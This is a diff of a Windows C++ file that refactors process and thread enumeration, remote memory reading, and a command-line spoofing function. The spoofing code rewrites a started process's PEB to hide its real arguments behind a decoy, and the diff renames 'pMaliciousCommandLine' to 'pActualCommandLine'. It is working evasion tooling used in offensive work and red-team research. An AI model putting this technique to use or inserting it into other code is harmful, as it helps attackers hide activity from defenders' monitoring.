@@ -336,7 +336,7 @@ BOOLEAN FetchLocalThreadHandle
 	THREADENTRY32 th32ThreadEntry_t = { };
 
 	th32ThreadEntry_t.dwSize = sizeof(THREADENTRY32);
-\
+
 	if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)) == INVALID_HANDLE_VALUE) goto cleanup;
 
 	if (!Thread32First(hSnapshot, &th32ThreadEntry_t)) goto cleanup;
@@ -561,42 +561,36 @@ BOOLEAN FetchProcessHandleNtQuerySystemInformation
 	fnNtQuerySystemInformation   pfNtQuerySystemInformation	 = nullptr;
 	
 
-	if ((pfNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcessAddressReplacement(GetModuleHandleReplacement(L"ntdll.dll"), const_cast<LPSTR>("NtQuerySystemInformation"))) == nullptr) return FALSE;
+	if ((pfNtQuerySystemInformation = reinterpret_cast<fnNtQuerySystemInformation>(GetProcessAddressReplacement(GetModuleHandleReplacement(L"ntdll.dll"), const_cast<LPSTR>("NtQuerySystemInformation")))) == nullptr) return FALSE;
 
-	pfNtQuerySystemInformation(SystemProcessInformation, nullptr, 0, &ulReturnedLengthValue1);
+	pfNtQuerySystemInformation(SystemProcessInformation, nullptr, NULL, &ulReturnedLengthValue1);
 
-	if ((pSystemProcessInformation_t = static_cast<PSYSTEM_PROCESS_INFORMATION>(LocalAlloc(LPTR, ulReturnedLengthValue1))) == nullptr) return FALSE;
+	if ((pSystemProcessInformation_t = static_cast<PSYSTEM_PROCESS_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulReturnedLengthValue1))) == nullptr) return FALSE;
 
 	PVOID pValueToFree = pSystemProcessInformation_t;
 
 	if (pfNtQuerySystemInformation(SystemProcessInformation, pSystemProcessInformation_t, ulReturnedLengthValue1, &ulReturnedLengthValue2) != 0) goto _cleanup;
 
-	while (TRUE)
-	{
-		if (pSystemProcessInformation_t->ImageName.Length && _wcsicmp(pSystemProcessInformation_t->ImageName.Buffer, szProcName) == 0) 
-		{
+	while (TRUE) {
+		if (pSystemProcessInformation_t->ImageName.Length && _wcsicmp(pSystemProcessInformation_t->ImageName.Buffer, szProcName) == 0)  {
 			*pdwPid	   = reinterpret_cast<DWORD>(pSystemProcessInformation_t->UniqueProcessId);
-
 			*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *pdwPid);
-
-			if (*phProcess == nullptr || *phProcess == INVALID_HANDLE_VALUE) 
-			{
+			if (*phProcess == nullptr || *phProcess == INVALID_HANDLE_VALUE)  {
 				pSystemProcessInformation_t = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<ULONG_PTR>(pSystemProcessInformation_t) + pSystemProcessInformation_t->NextEntryOffset);
 				continue;
 			}
-
 			bState = TRUE;
-
 		_cleanup:
-
-			if (pSystemProcessInformation_t != nullptr) LocalFree(pValueToFree);
-
+			if (pSystemProcessInformation_t != nullptr) {
+				LocalFree(pValueToFree);
+			}
 			pSystemProcessInformation_t = nullptr;
-
-			return bState;
+ 			return bState;
 		}
 
-		if (pSystemProcessInformation_t->NextEntryOffset == NULL) goto _cleanup;
+		if (pSystemProcessInformation_t->NextEntryOffset == NULL) {
+			goto _cleanup;
+		}
 
 		pSystemProcessInformation_t = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<ULONG_PTR>(pSystemProcessInformation_t) + pSystemProcessInformation_t->NextEntryOffset);
 	}
@@ -609,11 +603,15 @@ BOOLEAN FetchRemoteThreadHandle
 	   OUT PHANDLE phThreadHandle
 )
 {
-	if (!dwProcessId || !pdwThreadId || !phThreadHandle) return FALSE;
+	if (!dwProcessId || !pdwThreadId || !phThreadHandle) {
+		return FALSE;
+	}
 
 	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessId);
 
-	if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
+	if (hSnapshot == INVALID_HANDLE_VALUE) {
+		return FALSE;
+	}
 
 	BOOLEAN bState = FALSE;
 
@@ -623,8 +621,7 @@ BOOLEAN FetchRemoteThreadHandle
 
 	if (Thread32First(hSnapshot, &th32Thread_t) == FALSE) goto cleanup;
 
-	do
-	{
+	do {
 		if (th32Thread_t.th32OwnerProcessID == dwProcessId)
 		{
 			*pdwThreadId    = th32Thread_t.th32ThreadID;
@@ -1064,13 +1061,13 @@ BOOLEAN MapLocalMemory
 BOOLEAN ReadStructureFromProcess
 (
 	IN     HANDLE hTargetProcess, 
-	IN     PVOID  pPEBBaseAddress, 
+	IN     PVOID  pStructAddress, 
 	   OUT PVOID *pReadBufferAddress, 
 	IN     DWORD  dwBufferSize,
 	IN     HANDLE hHeap
 )
 {
-	if (!hTargetProcess || !pPEBBaseAddress ||  !dwBufferSize || !pReadBufferAddress) return FALSE;
+	if (!hTargetProcess || !pStructAddress ||  !dwBufferSize || !pReadBufferAddress) return FALSE;
 
 	if (*pReadBufferAddress)
 	{
@@ -1081,7 +1078,7 @@ BOOLEAN ReadStructureFromProcess
 
 	*pReadBufferAddress = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwBufferSize);
 
-	if (!ReadProcessMemory(hTargetProcess, pPEBBaseAddress, *pReadBufferAddress, dwBufferSize, &sBytesRead) || sBytesRead != dwBufferSize) return FALSE;
+	if (!ReadProcessMemory(hTargetProcess, pStructAddress, *pReadBufferAddress, dwBufferSize, &sBytesRead) || sBytesRead != dwBufferSize) return FALSE;
 
 	return TRUE;
 }
@@ -1099,7 +1096,7 @@ LPWIN32_FIND_DATA_ARRAYW RefetchFilesArrayW
 BOOLEAN SpoofCommandLineArguments
 (
 	IN     LPWSTR  pSpoofedCommandLine,
-	IN	   LPWSTR  pMaliciousCommandLine,
+	IN	   LPWSTR  pActualCommandLine,
 	IN     DWORD   dwSpoofedCLALength,
 	   OUT PHANDLE phProcessHandle,
 	   OUT PDWORD  pdwProcessId,
@@ -1107,21 +1104,21 @@ BOOLEAN SpoofCommandLineArguments
 	   OUT PDWORD  pdwThreadId
 )
 {
-	if (!pSpoofedCommandLine || !pMaliciousCommandLine || !dwSpoofedCLALength || !phProcessHandle 
+	if (!pSpoofedCommandLine || !pActualCommandLine || !dwSpoofedCLALength || !phProcessHandle 
 	  ||!pdwProcessId		 || !phThreadHandle		   || !pdwThreadId			   ) return FALSE;
 
 	BOOLEAN						  bState				  = FALSE;
 	PPEB						  pProcEnvBlock_t		  = nullptr;
 	fnNTQueryProcessInformation   NtQueryProcInfo		  = nullptr;
 	PRTL_USER_PROCESS_PARAMETERS  pProcessUserParameters  = nullptr;
-	ULONG						  ulRetren				  =   0;
-	NTSTATUS					  NtStatus				  =   0;
-	WCHAR						  pProcess[MAX_PATH]	  = { 0 };
-	STARTUPINFOW				  StartupInfo_t			  = { 0 };
-	PROCESS_INFORMATION			  ProcessInformation_t    = {   };
-	PROCESS_BASIC_INFORMATION	  ProcessBasicInfoBlock_t = {   };
+	ULONG						  ulRetren				  = NULL;
+	NTSTATUS					  NtStatus				  = ERROR_SUCCESS;
+	WCHAR						  pProcess[MAX_PATH]	  = {  };
+	STARTUPINFOW				  StartupInfo_t			  = {  };
+	PROCESS_INFORMATION			  ProcessInformation_t    = {  };
+	PROCESS_BASIC_INFORMATION	  ProcessBasicInfoBlock_t = {  };
 	HANDLE						  hHeap					  = GetProcessHeap();
-	DWORD						  dwExposedLength = sizeof(L"powershell.exe");
+	DWORD						  dwExposedLength		  = NULL;
 
 	if ((NtQueryProcInfo = (fnNTQueryProcessInformation)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess")) == nullptr) return FALSE;
 
@@ -1138,8 +1135,8 @@ BOOLEAN SpoofCommandLineArguments
 	if (!ReadStructureFromProcess(ProcessInformation_t.hProcess, ProcessBasicInfoBlock_t.PebBaseAddress, reinterpret_cast<PVOID*>(&pProcEnvBlock_t), sizeof(PEB), hHeap)) goto EndOfFunc;
 	 
 	if (!ReadStructureFromProcess(ProcessInformation_t.hProcess, pProcEnvBlock_t->ProcessParameters, reinterpret_cast<PVOID *>(&pProcessUserParameters), sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF,hHeap )) goto EndOfFunc;
-
-	if (!WriteToTargetProcessEnvironmentBlock(ProcessInformation_t.hProcess, pProcessUserParameters->CommandLine.Buffer, pMaliciousCommandLine, static_cast<DWORD>(lstrlenW(pMaliciousCommandLine) * sizeof(WCHAR) + 1))) goto EndOfFunc;
+	
+	if (!WriteToTargetProcessEnvironmentBlock(ProcessInformation_t.hProcess, pProcessUserParameters->CommandLine.Buffer, pActualCommandLine, static_cast<DWORD>(lstrlenW(pActualCommandLine) * sizeof(WCHAR) + 1))) goto EndOfFunc;
 	
 	if (!WriteToTargetProcessEnvironmentBlock(ProcessInformation_t.hProcess, pProcEnvBlock_t->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),&dwExposedLength, sizeof(DWORD))) goto EndOfFunc;
 
